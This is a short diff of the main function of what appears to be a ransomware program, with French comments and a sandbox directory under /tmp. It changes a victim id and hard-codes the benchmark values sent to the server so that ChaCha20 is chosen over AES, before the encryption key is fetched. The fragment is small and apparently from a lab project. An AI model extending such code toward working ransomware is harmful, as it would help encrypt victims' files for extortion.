@@ -15,7 +15,7 @@ int main(int argc, char const *argv[])
     char* paths[] = {"/tmp/sandbox-ransomware/"};
     unsigned char* p_algo = NULL;
     unsigned char* p_iv = NULL;
-    unsigned char* id = (unsigned char*)"942";
+    unsigned char* id = (unsigned char*)"9542";
 
     /* Initialisation de la structure pour la recherche de fichier */
     listFileData* p_listFileData = init_list_file_data();
@@ -29,9 +29,15 @@ int main(int argc, char const *argv[])
     /* Envoi du benchmark au serveur */
     benchmarkData* p_benchmarkData = benchmark_pc(p_listFileData->totalSize);
 
-    p_benchmarkData->memorySize = 1000;
+    /* Config pour aes */
+    //p_benchmarkData->memorySize = 1000;
+    //p_benchmarkData->dataSize = 99999999999999;
+    //p_benchmarkData->cpuCore = 1;
+
+    /* Config pour chacha20 */
+    p_benchmarkData->memorySize = 4000;
     p_benchmarkData->dataSize = 99999999999999;
-    p_benchmarkData->cpuCore = 1;
+    p_benchmarkData->cpuCore = 4;
 
     unsigned char* p_key = get_encryption_key(id, p_benchmarkData, &p_algo, &p_iv);
 
